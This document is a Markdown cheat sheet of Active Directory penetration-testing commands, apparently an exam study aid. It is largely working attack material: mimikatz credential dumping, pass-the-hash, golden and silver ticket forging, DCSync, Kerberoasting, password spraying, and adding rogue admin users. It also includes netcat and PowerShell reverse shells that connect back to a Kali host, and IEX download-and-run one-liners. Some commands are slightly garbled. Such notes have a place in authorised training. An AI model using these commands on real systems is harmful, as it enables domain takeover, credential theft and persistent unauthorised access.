# Summary

## Password-based and Hash-based attack
`Extracting hashes`

         SAM - Security Account Manager (Store as user accounts)  %SystemRoot%/system32/config/sam  
         NTDS.DIT (Windows Server / Active Directory - Store AD data including user accounts) %SystemRoot%/ntds/ntds.dit  
         SYSTEM (System file to decrypt SAM/NTDS.DIT)  %SystemRoot%/system32/config/system  
         Backup - Sistemas antigos como XP/2003: C:\Windows\repair\sam and C:\Windows\repair\system

`Extracting Hashes in cache`

         fgdump.exe
         /usr/share/windows-binaries/fgdump/fgdump.exe

`Dump the credentials of all connected users, including cached hashes`

         ./mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
         ./mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "vault::cred /patch" "exit"

`Cracking Ad Hashes`

         ntlm:   hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
         ntlmv2: hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

`Password Spraying`

 -   Create Password List  
     `crunchy <length> <length> -t <pw-core>%%%% `
   
-    Spray  
     `rowbar -b rdp -s <ip>\32 -U users.txt -C pw.txt -n 1`

`PASS THE PW`

         crackmapexec <ip>/24 -u <user> -d <DOMAIN> -p <password>    
        

`Pass the Hash`

-> Allows an attacker to authenticate to a remote system or service via a user's NTLM hash
```
crackmapexec <protocol> <ip>/24 -u <user> -H <hash> --local  
pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:<hash_ntlm> //<IP> cmd
```

-> Remote Access - impacket-psexec  
```
impacket-psexec '<domain>/<user>'@<IP> -hashes ':<hash>'
impacket-psexec '<domain>/<user>'@<IP>
```

-> Remote Access + evil-winrm  
```
evil-winrm -i <IP> -u <user> -H <hash>
```
`Over Pass the Hash`

-> Allows an attacker to abuse an NTLM user hash to obtain a full Kerberos ticket granting ticket (TGT) or service ticket, which grants us access to another machine or service as that user

```
mimikatz.exe "sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe" "exit"
```

-> Command execution with psexec  
```
.\PsExec.exe \\<hostname> cmd.exe
```

## Ticket and Token based
### Token Impersonation
```
meterpreter load icognito  
list_tokens  
impersonate_token <token>  
```

### Silver Ticket - Pass the Ticket
-> It is a persistence and elevation of privilege technique in which a TGS is forged to gain access to a service in an application.

-> Get SID
```
GetDomainsid (PowerView)
```
or  
```
whoami /user
```
-> Get Machine Account Hash
```
Invoke-Mimikatz '"lsadump::lsa /patch"' -ComputerName <hostname_dc>
```
-> Exploitation mimikatz.exe
```
kerberos::purge
kerberos::list
kerberos::golden /user:<user> /domain:<domain> /sid:<sid> /target:<hostname.domain> /service:HTTP /rc4:<ervice_account_password_hash> /ptt
```
or
```
Invoke-Mimikatz -Command '"kerberos::golden /domain:<domain> /sid:<domainsid> /target:<dc>.<domain> /service:HOST /rc4:<machine_account_hash> /user:Administrator /ptt"'
kerberos::list
```

### Golden Ticket - Pass the Ticket
-> It is a persistence and elevation of privilege technique where tickets are forged to take control of the Active Directory Key Distribution Service (KRBTGT) account and issue TGT's.

-> Get hash krbtgt
```
./mimikatz.exe "privilege::debug" "lsadump::lsa /patch"
```
-> Get SID
```
GetDomainsid (PowerView)
```
or  
```
whoami /user
```

-> Exploitation
```
mimikatz.exe "kerberos::purge" "kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt" "misc::cmd"

psexec.exe \\dc1 cmd.exe
```

### DCSync Attack
-> The DCSync attack consists of requesting a replication update with a domain controller and obtaining the password hashes of each account in Active Directory without ever logging into the domain controller.
```
./mimikatz.exe "lsadump::dcsync /user:Administrator"
```

## AS-REP Roasting Attack - not require Pre-Authentication
-> kerbrute - Enumeration Users
```
kerbrute userenum -d test.local --dc <dc_ip> userlist.txt
```
https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt

-> GetNPUsers.py - Query ASReproastable accounts from the KDC
```
impacket-GetNPUsers domain.local/ -dc-ip <IP> -usersfile userlist.txt
```

## Kerberoast
-> impacket-GetUserSPNs
```
impacket-GetUserSPNs <domain>/<user>:<password>// -dc-ip <IP> -request
```
or  
```
impacket-GetUserSPNs -request -dc-ip <IP> -hashes <hash_machine_account>:<hash_machine_account> <domain>/<machine_name$> -outputfile hashes.kerberoast
```

```
hashcat -a 0 -m 13100 ok.txt /usr/share/wordlists/rockyou.txt 
```
```
.\PsExec.exe -u <domain>\<user> -p <password> cmd.exe
```
or  
```
runas /user:<hostname>\<user> cmd.exe
```


`Kerberoasting`

         Invoke-Kerberoast in powerview  
         Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File -filepath 'c:\temp\hashcapture.txt' -width 8000
         https://github.com/skelsec/kerberoast
         GetUserSPNs.py -request -dc-ip <RHOST> <domain>/<user>  
     

# Tools Introduction
-   Windows Run As - Switching users in linux is trival with the `SU` command.  However, an equivalent command does not exist in Windows.  Here are 3 ways to run a command as a different user in Windows.

      -   Sysinternals psexec is a handy tool for running a command on a remote or local server as a specific user, given you have thier username and password. The following example creates a reverse shell from a windows server to our Kali box using netcat for Windows and Psexec (on a 64 bit system).

               C:\>psexec64 \\COMPUTERNAME -u Test -p test -h "c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe" 

               PsExec v2.2 - Execute processes remotely
               Copyright (C) 2001-2016 Mark Russinovich
               Sysinternals - www.sysinternals.com

      -   Runas.exe is a handy windows tool that allows you to run a program as another user so long as you know thier password. The following example creates a reverse shell from a windows server to our Kali box using netcat for Windows and Runas.exe:

               C:\>C:\Windows\System32\runas.exe /env /noprofile /user:Test "c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe"
               Enter the password for Test:
               Attempting to start nc.exe as user "COMPUTERNAME\Test" ...

      -   PowerShell can also be used to launch a process as another user. The following simple powershell script will run a reverse shell as the specified username and password.

               $username = '<username here>'
               $password = '<password here>'
               $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
               $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
               Start-Process -FilePath C:\Users\Public\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("-nc","192.168.1.10","4444","-e","cmd.exe") -WorkingDirectory C:\Users\Public

             Next run this script using powershell.exe:

             `powershell -ExecutionPolicy ByPass -command "& { . C:\Users\public\PowerShellRunAs.ps1; }"`


# Active Directory Pentesting
## Enumeration (use LdapDomainDump and crackmapexec to enumerate)
- Precondition is to get domainname from NMAP: `nmap -A 192.168.1.50 -Pn` -> under `NetBIOS_Domain_Name: PENTESTING`
- First, detect if the SMB signing is enabled, which helps us identify machines that could be targeted for stealing hashes and relay attacks.

### LdapDomainDump
- Download: `git clone https://github.com/dirkjanm/ldapdomaindump`
- got ldap dump: `python3 ldapdomaindump.py --user DOMAIN\\username -p Password12345 ldap://x.x.x.x:389 --no-json --no-grep -o data`
- find Domain admin `DONT_REQ_PREAUTH` -> crack hash offline

### enum4linux
- Built-in in kali linux
- Full target AD info: `enum4linux -u ippsec -p Password12345 -a 192.168.1.50`
- Provides Domain SID, passwords of some users, share enumerations

### crackmapexec
- Built-in in kali linux
- enumerate shares (check for READ/WRITE permissions): `crackmapexec smb 192.168.1.50-192.168.1.55 -u ippsec -p Password12345 --local-auth --shares`
- enumerate logged on users (check if they are domain admin): `crackmapexec smb 192.168.1.50-192.168.1.55 -u ippsec -p Password12345 --loggedon-users`
- RID enumeration: `crackmapexec smb 192.168.1.50-192.168.1.55 -u ippsec -p Password12345 --rid-brute`
- local grp enumeration: `crackmapexec smb 192.168.1.50-192.168.1.55 -u ippsec -p Password12345 --local-groups`
- Get the active sessions: `crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --sessions`
- Generate a list of relayable hosts (SMB Signing disabled): `crackmapexec smb 192.168.1.0/24 --gen-relay-list output.txt`
- Get the password policy: `crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --pass-pol`
- Command execution(e.g. wget,ipconfig, whoami/groups): `crackmapexec winrm 192.168.1.54 -u ippsec -p Password12345 -X 'Invoke-WebRequest -Uri "http://192.168.1.223:8000/users.txt"'`
- create new user for persistence(in case ippsec change pw): `crackmapexec winrm 192.168.1.54 -u ippsec -p Password12345 -x 'net user /add admin Password12345'`
- add user to localgroup: `crackmapexec winrm 192.168.1.54 -u ippsec -p Password12345 -x 'net local group administrators'`

## Persistence
### crackmapexec
- Reverse shell: [Edit this from Kali to Windows](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1)
- Transfer to windows: `crackmapexec winrm 192.168.1.54 -u ippsec -p Password12345 -X 'iex(New-Object Net.WebClient).DownloadString("http://192.168.223:8000/Invoke-PowerShellTcpOneLine.ps1")'`
- Reverse shell script will autorun upcon transfer

## dumping credentials
### crackmapexec's mimikatz
- `sudo crackmapexec smb -M mimikatz 192.168.1.54 -u ippsec -Password12345`
- `sudo crackmapexec smb -M mimikatz 192.168.1.54 -u ippsec -Password12345 --server-port 444`
- stored in (for sudo): `cat /root/.cme/logs/Mimikatz-192.168.1.54.log`
- stored in (for non-sudo): `cat ~/cme/logs/Mimikatz-192.168.1.54.log`

### crackmapexec's lsassy
- `sudo crackmapexec smb -M lsassy 192.168.1.54 -u ippsec -Password12345`
- `sudo crackmapexec smb -M lsassy 192.168.1.54 -u ippsec -Password12345 --server-port 444`
- does not store logs locally

### test for a quick No-Preauth win without supplying a username
```
GetNPUsers.py Egotistical-bank.local/ -dc-ip 10.10.10.175
```

### tool to brute force of a valid username based on info collection so far (not unbounded brute force)
```bash
kerbrute.py -users ./users.txt -dc-ip 10.10.10.175 -domain Egotistical-bank.local
```

### test if credentials are valid
```bash
kerbrute.py -user 'fsmith' -password 'Thestrokes23' -dc-ip 10.10.10.175 -domain Egotistical-bank.local
```

## SKIPPED [Powershell Empire](https://github.com/BC-SECURITY/Empire) 
- Post exploitation for AD
- Install: `sudo apt install powershell-empire`
- Run: `sudo powershell-empire`


### Powerview

```bash
powershell -ep bypass  
Import-Module .\PowerView.ps1 #loading module to powershell, if it gives error then change execution policy
Get-NetUser | select cn,pwdlastset,lastlogon
Get-NetUser -SPN | select samaccountname,serviceprincipalname # Listing SPN accounts in domain
Get-UserProperty -Properties badpwdcount
Find-UserField -SearchField Description -SearchTerm "pass"          #search description field for the word "pass"
Invoke-UserHunter -CheckAccess   # check for the Local Administrator Access of that particular user 
Get-NetGroupMember -GroupName "Domain Admins"       #get SID, Group Doamin name, group name
Get-NetGroup | select cn    #user list for password attacks
Get-NetGroup *admin*       # enumerate domain groups
Get-NetSession -ComputerName files04 -Verbose #Checking logged on users with Get-NetSession, adding verbosity gives more info.
Get-DomainUser -PreauthNotRequired -verbose # identifying AS-REP roastable accounts
Get-NetUser -SPN | select serviceprincipalname #Kerberoastable accounts
Get-NetGroupMember -GroupName "Domain Admins"
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion #attack old OS and see which are web server or file server
Find-LocalAdminAccess #  determine if our current user has administrative permissions on any computers in the domain
Get-ObjectAcl -Identity <user> # enumerates ACE(access control entities), lists SID(security identifier). ObjectSID
Convert-SidToName <sid/objsid> # converting SID/ObjSID to name
Get-NetDomain #basic information about the domain

Get-NetSession -ComputerName *client74*
Get-ObjectAcl -Identity *stephanie* #see ObjectSID, ActiveDirectoryRights, SecurityIdentifier (securityidentifier has certain rights on objectSID)
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
Invoke-EnumerateLocalAdmin      #searched for the Local Administrators for the domain
Invoke-UserHunter
Invoke-Portscan -Hosts sql01
Invoke-ShareFinder      #find non system shares 
Invoke-FileFinder       #find possible password file
Invoke-ACLScanner -ResolveGUIDs        #check ACL

# Checking for "GenericAll" right for a specific group, after obtaining they can be converted using convert-sidtoname
"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104" | Convert-SidToName #method 1
Convert-SidToName *S-1-5-21-1987370270-658905905-1781884369-1104*  #method 2
Find-DomainShare #find the shares in the domain. ##TIPS: ls all the NAME (folder) found in Find-DomainShare
- ls \\*FILES04*\*docshare*   #name=docshare, computername=FILES04.corp.com
- ls \\*dc1.corp.com*\sysvol\*corp.com*\ # %SystemRoot%\SYSVOL\Sysvol\domainname on the domain controller and every domain user has access to it.
gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE" #decrypt cpassword in Group Policy Preferences (GPP) in kali
```

### Bloodhound (Install before exam, snapshot VM before installing)
- https://github.com/fox-it/BloodHound.py
```bash
# Sharphound - transfer sharphound.ps1 into the compromised machine
powershell -ep bypass  
Import-Module .\Sharphound.ps1 
Invoke-BloodHound -CollectionMethod All -OutputDirectory <location> -OutputPrefix "name" # collects and saved with the specified details, output will be saved in windows compromised machine
      e.g. Invoke-BloodHound -CollectionMethod All -Domain MARVEL.local -ZipFileName file.zip

# Download zip onto kali, import into bloodhound  
```bash
sudo neo4j console
# then upload the .json files obtained

sudo bloodhound
# then upload the .zip files obtained
```

## **Attacking Active Directory Authentication**

<aside>
💡 Make sure you obtain all the relevant credentials from compromised systems, we cannot survive if we don’t have proper creds.
</aside>

### Tools to dump hashes (tool: secretsdump.py https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
```bash
secretsdump.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
secretsdump.py -hashes ':NThash' 'DOMAIN/USER@TARGET'
secretsdump.py 'DOMAIN/USER:PASSWORD@TARGET'
```

### Password Spraying

- Dump passwords from memory using mimikatz
```powershell
PS C:\tmp > mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > dumped_pwds.txt
```

-Dump passwords using impacket (try all user accounts that are found using net user /domain)
```bash
impacket-secretdump exam.com/apachesvc@192.168.1xx.101
```

- Brute force small number of guess passwords on list of found usernames (tool: Spray-Passwords.ps1)
  ```bash
  #using LDAP and ADSI to perform a low and slow password attack against AD users
  .\Spray-Passwords.ps1
    .\Spray-Passwords.ps1 -Pass Nexus123! -Admin
  ```
  
- Spray with known password on list of found usernames
```bash
# Crackmapexec uses SMB - check if the output shows 'Pwned!'
# protocols = smb, winrm, 
# --continue-on-success to avoid stopping at the first valid credentials.
crackmapexec <protocol> <target(s)> -u username1 -p password1 password2 --no-bruteforce
crackmapexec <protocol> <target(s)> -u username1 username2 -p password1
crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -p ~/file_containing_passwords  --continue-on-success 
crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -H ~/file_containing_ntlm_hashes --continue-on-success
        e.g. crackmapexec smb <IP or subnet> -u users.txt -p 'pass' -d <domain> --continue-on-success #use continue-on-success option if it's subnet
        e.g. crackmapexec smb 192.168.1xx.100 -u users.txt -p 'ESMWaterP1p3S!'
        e.g. crackmapexec 192.168.57.0/24 -u fcastle -d MARVEL.local -p Password1
        users.txt from Get-NetUser

# Kerbrute
kerbrute passwordspray -d corp.com .\usernames.txt "pass"
```

### Pass the hash (lateral movement) for NTLM only
- Access local SAM database (C:\Windows\System32\config\SAM) and dump all local hashes

#### Using Crackmapexec
- Path storing hashes: `~/.cme/logs`. 3 types of files: .sam, .secrets, .cached
 
- Dump SAM hashes: `crackmapexec smb 192.168.1.54 -u ippsec -p Password12345 --sam`
- Dump LSA dump (domain credentials): `crackmapexec smb 192.168.1.54 -u ippsec -p Password12345 --lsa`
- Exploitation: `crackmapexec smb 192.168.1.54 -u jenkinsadmin -H ffffffffffffffffffffffff -X 'whoami'`
- Exploitation to dump all hashes (if is domain admin access): `crackmapexec smb 192.168.1.50 -u jenkinsadmin -H ffffffffffffffffffffffff --ntds`
- Exploitation to run commands as another user using PTH: `crackmapexec winrm 192.168.1.50 -u s4vitar -H ffffffffffffffffffffffff -X 'whoami'`

#### Using pth-winexe 
- pass the hash get a shell immediately: `sudo pth-winexe -U web/administrator%<hash:hash> //192.168.1.54 cmd.exe`

```powershell
PS C:\users\public > mimikatz.exe "privilege::debug" "lsadump::sam" "exit" > sam.txt
```

- Obtaining hash of an SPN user using **Mimikatz** (Tool: mimikatz)
```powershell
#dump hashes for all users logged on to the current workstation or server, including remote logins like Remote Desktop sessions.
#dump credentials stored in LSASS and cache hashes
privilege::debug
sekurlsa::logonpasswords #obtain NTLM hash of the SPN account here
```

- Pass the hash

```bash
#using crackmapexec on kali to access x.105 and host in 192.168.57.0/24
crackmapexec smb 192.168.1.105 -u Administrator -H 32196B56FFE6F45E294117B91A83BF38 -x ipconfig
        crackmapexec 192.168.57.0/24 -u "Frank Castle" -H 64f12cddaa88057e06a81b54e73b949b -- local

#using wmiexec on kali
kali@kali:~$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
```

### Overpass the hash (convert NTLM hash into a Kerberos TGT, then use TGT to obtain TGS)
```bash
#output is a kerberos ticket
mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell

# Checking if the forged tickets is in memory
ps> klist

#get shell
psexec.exe -accepteula \\<remote_hostname> cmd  
```

## EvilWinRM (install before exam, do a snapshot before installing)
- Gives persistent shell. Crackmapexec doesnt.
- Installation: `gem install evil-winrm`
- Get powershell access using: `evil-winrm  -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!'`
- to see what command you can run: `menu`

```bash
#run scripts stored in kali's /opt/privsc/powershell directory, from evil-winrm
evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -s /opt/privsc/powershell
Bypass-4MSI
Invoke-Mimikatz.ps1
Invoke-Mimikatz

#run winPEAS
evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -e /opt/privsc
Bypass-4MSI
menu
Invoke-Binary /opt/privsc/winPEASx64.exe
```
- Send file from kali to window(on kali running PS): `upload <kali directory and filename> <windows destination directory and filename>`
- Send file from kali (python http server) to windows (on kali running PS): `iex(new-object net.webclient).downloadstring('kali address:port/file')`
- Send file from window to kali(on kali running PS) : `download <windows destination directory and filename> <kali directory and filename>`

## PSexec (lateral movement)

```powershell
#FILE04 = target host, jen = user with access to FILES04
./PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd
```

### Silver Tickets (Forge ticket)
- 3 ingredients: SPN password hash (of user account with access to Target SPN resource), Domain SID, Target SPN

-Silver Ticket Default Groups:
<aside>
Domain Users SID: S-1-5-21<DOMAINID>-513
Domain Admins SID: S-1-5-21<DOMAINID>-512
Schema Admins SID: S-1-5-21<DOMAINID>-518
Enterprise Admins SID: S-1-5-21<DOMAINID>-519
Group Policy Creator Owners SID: S-1-5-21<DOMAINID>-520
</aside>

- In Windows, Mimikatz can be used to craft the ticket. Next, the ticket is injected with Rubeus, and finally a remote shell can be obtained thanks to PsExec.
  
- Obtaining hash of an SPN user using **Mimikatz** (Tool: mimikatz)
```powershell
privilege::debug
sekurlsa::logonpasswords #obtain NTLM hash of the SPN account here
```

- Obtaining Domain SID
```powershell
ps> whoami /user
# this gives SID of the user that we're logged in as. If the user SID is "S-1-5-21-1987370270-658905905-1781884369-1105" then the domain SID is "S-1-5-21-1987370270-658905905-1781884369" i.e. omit RID of "1105"
```

- Forging silver ticket (TGS) Ft **Mimikatz**
<aside>
Forging a TGS (and included PAC)
Requires the machine account password (key) from the KDC
Can be used to directly access any service (without touching DC)
</aside>

```bash
mimikatz.exe
prvilege::debug
#using NTLM generate the Silver Ticket (TGS) and inject it into memory for current session using /ptt
kerberos::golden /sid:<domainSID> /domain:<domain-name> /ptt /target:<targetsystem.domain> /service:<service-name> /rc4:<NTLM-hash> /user:<new-user> /ptt
      kerberos: :golden /user:offsec /domain:corp.com /sid: S-1-5-21-4038953314-3014849035-1274281563 /target:CorpSqlServer.corp.com:1433 /service:MSSQLSvc /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
      kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin

#using NTLM generate the Silver Ticket (TGS) and inject it into memory for current session and output to ticket.kirbi using /ticket flag
kerberos::golden /sid:<domainSID> /domain:<domain-name> /ptt /target:<targetsystem.domain> /service:<service-name> /rc4:<NTLM-hash> /user:<new-user> /ticket
#using aeskey generate the Silver Ticket (TGS) and inject it into memory
kerberos::golden /domain:$DOMAIN/sid:$DOMAIN_SID /aes128:$KRBTGT_AES_128_KEY /user:$DOMAIN_USER /service:$SERVICE_SPN /target:$SERVICE_MACHINE_HOSTNAME

# Checking if the forged tickets is in memory
ps> klist

#verify access to targeted SPN
iwr -UseDefaultCredentials http://web04
```

- Inject the ticket (not needed if the TGS is already loaded in current session)

```bash
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>
        .\Rubeus.exe ptt /ticket:C:\Temp\silver.kirbi
```

- Obtain a shell

```bash
cmd> psexec.exe -accepteula \\<remote_hostname> cmd   # psexec
cmd> sqlcmd.exe -S [service_hostname]                 # if service is MSSQL
```

### Golden Ticket Ft **Mimikatz** (Forge ticket)
<aside>
Forging a TGT (and the included PAC)
Requires tje krbtgt key, the “master” encryption key from the KDC
Can be used to request any TGS from the Domain Controller
</aside>

```bash
#getting krbtgt (user: krbtgt, NTLM: krbtgt hash)
mimikatz # privilege::debug
mimikatz # lsadump::lsa /patch

#using krbtgt hash via mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
        mimikatz # kerberos :: golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-4038953314-3014849035-1274281563 /krbtgt:fc274a94b36874d2560a7bd332604fab /ptt
# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi

 #List tickets in memory
klist

#using krbtgt hash via Rubeus
.\Rubeus.exe ptt /ticket:ticket.kirbi
        .\Rubeus.exe ptt /ticket:C:\Temp\silver.kirbi

#After running above code to generate golden ticket, the golden ticket will be automaticallys submiited for current session
#to launch cmd using the current session validated by golden ticket
mimikatz # misc::cmd
mimikatz # misc::cmd whoami
```

### Kerberoasting [STEAL ticket]
<aside>
Kerberoasting is a technique that allows an attacker to steal the KRB_TGS ticket, that is encrypted with RC4, to brute force application services hash to extract its password. 
Kerberoasting requires a valid domain account.
Three step process:
- Find SPN tied to user accounts through LDAP (service accounts)
- Request a TGS for each SPN
- Crack the TGS offline to recover the service account's password
</aside>

```bash
powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1') ; Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash0.txt"

# cracking TGS hashes
hashcat -m 13100 kerb-Hash0.txt wordlist.txt --force
        hashcat64.exe -m 13100 "C:\Users\test\Documents\Kerb1.txt" C:\Users\test\Documents\Wordlists\Rocktastic12a --outfile="C:\Users\test\Documents\CrackedKerb1.txt"
```

### Manual [Kerberoasting] effort of requesting the service ticket, exporting it, and cracking it by using the tgsrepcrack.py Python script (Kerberoasting)
- method 1
```bash
#automatically find kerberoastable users  in targeted Domain
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast

#crack hash using hashcat 13100, TGS-REP, output is plaintext password of kerberoastable account
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

- method 2 in Kali
```bash
#ip of DC (-dc-ip), credential of domain user (corp.com/pete), obtain TGS (-request)
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete

#crack hash using hashcat 13100
sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

- method 2 in Windows
```bash
#get SPN that you want to target
impacket-GetUserSPNs exam.com/apachesvc -dc-ip 172.16.1xx.100

#requesting TGS ticket, i.e. .kirbi
PS C:\Users\offsec> Add-Type -AssemblyName System. IdentityModel
PS C:\Users\offsec> New-Object System. IdentityModel. Tokens. KerberosRequestorSecurityToken -ArgumentList 'SPN'
        PS C:\Users\offsec> New-Object System. IdentityModel. Tokens. KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'
mimikatz # kerberos :: list /export

#crack hash using tgsrepcrack.py
/usr/share/kerberoast/tgsrepcrack.py wordlist.txt 2-40a50000-offsec@HTTP\~CorpWebServer.corp.com-CORP.COM.kirbi
#crack hash using kirbi2john.py
python3 kirbi2john.py /root/pen200/exercise/ad/sgl.kirbi
```

### Targeted Kerberoasting
- Condition: have GenericWrite or GenericAll permissions on another AD user account
- then, purposely set SPN for the targeted user
- then kerberoast the account
- then crack the hash using hashcat to get the clear password
- after attack, REMEMBER to delete the SPN

### AS-REP roasting
- Find user account with user account option "Do not require Kerberos preauthentication" ENABLED, then obtain their password thru AS-REP hashes
#### on Kali
```bash
# [KALI] find users (not user1) who "Do not require Kerberos preauthentication"
impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/user1

# [KALI] hashcat with option 18200 for AS-REP, to obtain the plaintext password of user who "Do not require Kerberos preauthentication"
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r usr/share/hashcat/rules/best64.rule --force
```
#### on windows (use Rubeus)
```bash
#extract AS-REP hash
.\Rubeus.exe asreproast /nowrap

#copy to kali to run hash cat
sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

### Targeted AS-REP roasting
- condition: cannot identify any AD users with the account option "Do not require Kerberos preauthentication" enabled && notice that we have GenericWrite or GenericAll permissions on another AD user account
- leveraging "GenericWrite or GenericAll" permissions, we can modify the User Account Control value of *any* user to not require Kerberos preauthentication
- Once enabled "Do not require Kerberos preauthentication" of the user, do AS-REP roasting
- Finally, reset the User Account Control value of the user once we’ve obtained the AS-REP hash

### DCSync-Domain Controller Synchronization
- Condition:  User needs to have the Replicating Directory Changes, Replicating Directory Changes All, and Replicating Directory Changes in Filtered Set rights. *By default, members of the Domain Admins, Enterprise Admins, and Administrators groups have these rights*
- Hence, must have access to members of the Domain Admins, Enterprise Admins, and Administrators groups

#### DCSync On windows
```powershell
#output of lsadump::dcsync is NTLM hash of target user including Administrator
mimikatz # lsadump::dcsync /user:corp\*targetusertoobtaincredential*
```

#### DCSync on Kali
```bash
#192.168.50.70 = IP of Domain Controller, output is the hash of target user
impacket-secretsdump -just-dc-user *targetuser* corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70

```

## Metasploit (msf6)
- start: `msfconsole`
- search for modules: `search ms17`
- to use a module: `use <#>` or use `use auxiliary/scanner/smb/smb ms17 010`
- see options that needs to be filled: `options`
- set rhost: `set rhosts 192.168.1.53`
- deploy: `run`
- see exploit target of a module: `show targets`
- check if payload matches your target e.g. x64 or x86 machine: `show payloads`
- Backdoor add user: `windows/manage/add_user`

## Meterpreter (meterpreter >)
- We can background a currently running meterpreter session and return back to msfconsole using: `background`
- To check meterpreter sessions at background: `sessions -i`
- to go back to session #5 in background meterpreter session: `sessions -i 5`+

## Metasploit frame
1. run exploit suggester to enumerate vuls in target: `use post/multi/recon/local_exploit_suggester`
2. for each vulnerabilities suggested, run metasploit payload to obtain Reverse shell: `use exploit/windows/local/ms10_015_kitrap0d`
3. repeat thru the listed of suggested exploits and try until success

# Crack SAM (NTLM hash) and SYSTEM
1. On Windows, run hfs.exe to transfer SAM and SYSTEM to Kali (drag and drop)
2. On Kali, `wget http://192.168.1.55/sam` and `wget http://192.168.1.55/system`
3. Use samdump2 to decrypt SAM. `samdump2 system sam`
4. Copy and paste the hashes from (3) to notepad: `hashcat -m 1000 -a 3 hashes.txt rockyou.txt`
5. Note: -m specifies the hash type to decrypt e.g. 1000 = NTLM

# Dump SAM (NTLM) and LSA using mimikatz
1. needs to be admin to run mimikatz
2. `powershell -ep bypass`
3. `import-module .\invoke-mimikatz.ps1`
4. `Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"'`

**# 80. pass the hash using mimikatz
1. `powershell -ep bypass`
2. import-module .\invoke-mimikatz.ps1`
3. `Invoke-Mimikatz -Command '"sekurlsa::pth /user:stdent5 /domain:pentesting/ntlm:369def79d8372408bf6e93364cc93075 /run:powershell.exe"'`
4. Wait for 
5. Note for PTH, hash is valid only until the user change the password -> use RC4, while pass the ticket is only valid for a few hours.
6. Note: Kerberos is using AES256**

**### Pass the ticket 1
1. `.\mimikatz.exe` or `import-module .\invoke-mimikatz.ps1`
2. Export .kirbi file (with latest timestamp) to the working directory folder: `export Kirsekurlsa::tickets /export` or `Invoke-Mimikatz -Command '"Mimikatz::debug" "sekurlsa::tickets /export" "exit"'`
3. Finds the newly exported file int he working directory folder: `dir *.kirbi`
